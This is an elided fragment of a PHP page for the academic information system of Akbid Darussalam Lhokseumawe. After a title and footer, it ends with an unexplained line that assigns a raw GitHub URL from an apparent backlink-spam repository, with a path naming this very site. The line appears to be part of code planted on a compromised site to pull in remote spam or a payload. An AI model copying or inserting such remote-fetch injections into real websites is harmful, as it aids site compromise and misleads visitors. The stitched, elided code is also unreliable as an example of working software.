...
<body>
	...
	<div id="wrapper">
		...
		<p align="center" style="font-size: 15px; font-weight: bold;">Sistem Informasi Akademik Akbid Darussalam</p>
		<?php
		if ($_GET['code'] == 1){
		?>
		...
		<div id="powered">
		<p>Copyright &copy; <?php echo date('Y'); ?> Akbid Darussalam Lhokseumawe</p>
		</div>
	</div>
...
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/akbiddar/siakad.akbiddarussalam.ac.id/system.txt';
